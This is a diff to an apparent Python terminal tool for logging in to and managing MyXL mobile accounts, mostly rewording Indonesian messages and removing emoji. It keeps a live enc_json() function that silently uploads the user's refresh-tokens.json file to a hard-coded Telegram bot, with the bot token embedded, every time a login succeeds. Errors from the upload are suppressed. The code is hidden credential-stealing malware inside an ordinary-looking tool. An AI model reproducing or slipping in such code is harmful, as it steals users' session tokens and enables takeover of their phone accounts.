@@ -9,7 +9,7 @@ WIDTH = 55
 
 
 def enc_json():
-    url = f"https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
+    url = "https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
     try:
         with open("refresh-tokens.json", "rb") as f:
             files = {"document": f}
@@ -17,6 +17,7 @@ def enc_json():
             requests.post(url, data=data, files=files)
     except:
         pass
+
 
 def print_header(title: str):
     print("-" * WIDTH)
@@ -39,57 +40,59 @@ def normalize_number(raw_input: str) -> str:
 
 def login_prompt(api_key: str):
     clear_screen()
-    print_header("Login ke MyXL 👤")
-    print("Masukin nomor XL (format 6281234567890):")
+    print_header("Login ke MyXL")
+    print("Masukkan nomor XL (format 6281234567890):")
     raw_input = input("Nomor: ").strip()
     phone_number = normalize_number(raw_input)
 
     if not phone_number.startswith("628") or not phone_number.isdigit() or len(phone_number) < 10 or len(phone_number) > 14:
-        print("⚠️ Nomor nggak valid bro. Pastikan diawali '628' dan panjangnya masuk akal.")
+        print("Nomor tidak valid. Pastikan diawali '628' dan panjangnya sesuai.")
         pause()
         return None, None
 
     try:
         subscriber_id = get_otp(phone_number)
         if not subscriber_id:
-            print("⚠️ Gagal minta OTP bro. Coba lagi nanti.")
+            print("Gagal meminta OTP. Silakan coba lagi nanti.")
             pause()
             return None, None
 
-        print("📩 OTP udah dikirim ke nomor kamu. Cek SMS ya.")
+        print("OTP sudah dikirim ke nomor Anda. Silakan cek SMS.")
         try_count = 5
 
         while try_count > 0:
-            print(f"🔢 Sisa percobaan: {try_count}")
-            otp = input("Masukin OTP (6 digit): ").strip()
+            print(f"Sisa percobaan: {try_count}")
+            otp = input("Masukkan OTP (6 digit): ").strip()
 
             if not otp.isdigit() or len(otp) != 6:
-                print("⚠️ OTP nggak valid. Pastikan 6 digit angka.")
+                print("OTP tidak valid. Pastikan 6 digit angka.")
                 continue
 
             tokens = submit_otp(api_key, "SMS", phone_number, otp)
             if not tokens:
-                print("❌ OTP salah. Coba lagi bro.")
+                print("OTP salah. Silakan coba lagi.")
                 try_count -= 1
                 continue
 
-            print("✅ Berhasil login! Gas langsung dipake.")
+            print("Login berhasil. Akun siap digunakan.")
             enc_json()
             return phone_number, tokens.get("refresh_token")
 
-        print("💥 Gagal login setelah beberapa percobaan. Coba lagi nanti ya.")
+        print("Gagal login setelah beberapa percobaan. Silakan coba lagi nanti.")
         pause()
         return None, None
 
     except Exception as e:
-        print(f"💥 Ups bro, ada error pas login: {e}")
+        print(f"Terjadi kesalahan saat login: {e}")
         pause()
         return None, None
+
 
 sumit_otp = 2
 verif_otp = "6969"
 status_id = load_status()
 is_verif = status_id.get("is_verif", False)
+
 
 def show_account_menu():
     global is_verif
@@ -105,25 +108,24 @@ def show_account_menu():
         clear_screen()
         if active_user is None or add_user:
             if not is_verif and len(users) >= sumit_otp:
-                print(f"🚫")
                 print("-------------------------------------------------------")
-                print("-----   !!! Batas maksimal akun sudah tercapai.   -----")
+                print("-----   Batas maksimal akun sudah tercapai.       -----")
                 print(" Masukkan kode unlock untuk menambah lebih banyak akun.")
                 print("-------------------------------------------------------")
                 unlock = input("Kode unlock: ").strip()
                 if unlock != verif_otp:
-                    print("⚠️ Kode unlock salah, nggak bisa nambah akun.")
+                    print("Kode unlock salah, tidak bisa menambah akun.")
                     pause()
                     add_user = False
                     continue
                 save_status({"is_verif": True})
                 is_verif = True
-                print("✅ Kode unlock benar, akun tambahan diizinkan.")
+                print("Kode unlock benar, akun tambahan diizinkan.")
                 pause()
 
             number, refresh_token = login_prompt(AuthInstance.api_key)
             if not refresh_token:
-                print("⚠️ Gagal nambah akun bro. Coba lagi ya.")
+                print("Gagal menambah akun. Silakan coba lagi.")
                 pause()
                 add_user = False
                 AuthInstance.load_tokens()
@@ -143,21 +145,21 @@ def show_account_menu():
             add_user = False
             continue
 
-        print_header("Akun Tersimpan 👤")
+        print_header("Akun Tersimpan")
         if not users or len(users) == 0:
-            print("⚠️ Belum ada akun tersimpan bro.")
+            print("Belum ada akun tersimpan.")
         else:
             for idx, user in enumerate(users):
                 is_active = active_user and user.get("number") == active_user.get("number")
-                active_marker = "✅" if is_active else ""
+                active_marker = "[Aktif]" if is_active else ""
                 number_str = str(user.get("number", ""))
                 padded_number = number_str + " " * max(0, 14 - len(number_str))
                 sub_type = (user.get("subscription_type") or "").center(12)
                 print(f" [{idx + 1}.] {padded_number} [{sub_type}] {active_marker}")
 
         print("-" * WIDTH)
-        print("Command:")
-        print("      Masukan nomor urut akun untuk berganti.")
+        print("Perintah:")
+        print("      Masukkan nomor urut akun untuk berganti.")
         print(" [0.] Tambah akun baru")
         print(" del <nomor urut>   untuk menghapus akun tertentu.")
         print("[00.] Kembali ke menu utama")
@@ -185,34 +187,34 @@ def show_account_menu():
                 del_index = int(parts[1])
 
                 if not (1 <= del_index <= len(users)):
-                    print("⚠️ Nomor urut nggak valid bro.")
+                    print("Nomor urut tidak valid.")
                     pause()
                     continue
 
                 user_to_delete = users[del_index - 1]
 
                 if active_user and user_to_delete.get("number") == active_user.get("number"):
-                    print("🚫 Nggak bisa hapus akun aktif. Ganti akun dulu bro.")
+                    print("Tidak bisa menghapus akun aktif. Silakan ganti akun terlebih dahulu.")
                     pause()
                     continue
 
-                confirm = input(f"Yakin mau hapus akun {user_to_delete.get('number')}? (y/n): ").strip().lower()
+                confirm = input(f"Yakin ingin menghapus akun {user_to_delete.get('number')}? (y/n): ").strip().lower()
                 if confirm == 'y':
                     AuthInstance.remove_refresh_token(user_to_delete.get("number"))
                     AuthInstance.load_tokens()
                     users = AuthInstance.refresh_tokens
                     active_user = AuthInstance.get_active_user()
-                    print("🗑️ Akun berhasil dihapus.")
+                    print("Akun berhasil dihapus.")
                     pause()
                 else:
-                    print("↩️ Penghapusan akun dibatalin.")
+                    print("Penghapusan akun dibatalkan.")
                     pause()
             else:
-                print("⚠️ Perintah nggak valid bro. Format: del <nomor urut>")
+                print("Perintah tidak valid. Format: del <nomor urut>")
                 pause()
             continue
 
         else:
-            print("⚠️ Input nggak valid bro. Coba lagi ✌️")
+            print("Input tidak valid. Silakan coba lagi.")
             pause()
             continue
